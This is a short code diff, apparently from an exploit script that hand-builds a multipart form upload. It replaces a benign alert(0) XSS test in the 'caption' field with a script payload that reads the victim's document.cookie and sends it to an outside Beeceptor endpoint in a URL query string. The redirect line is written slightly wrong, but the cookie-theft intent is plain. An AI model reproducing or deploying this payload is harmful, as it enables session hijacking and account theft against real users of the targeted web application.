@@ -57,7 +57,10 @@
           "-----------------------------8086316936037828853394484197\r\n" + 
           "Content-Disposition: form-data; name=\"caption\"\r\n" + 
           "\r\n" + 
-          "\x3cscript\x3ealert(0)\x3c/script\x3e\r\n" + 
+          "\x3cscript\x3e\r\n" + 
+          "let c = document.cookie;\r\n" + 
+          "window.location(\"https://server.free.beeceptor.com?cookies=\"+c);\r\n" + 
+          "\x3c/script\x3e\r\n" + 
           "-----------------------------8086316936037828853394484197\r\n" + 
           "Content-Disposition: form-data; name=\"singleLocationId\"\r\n" + 
           "\r\n" + 
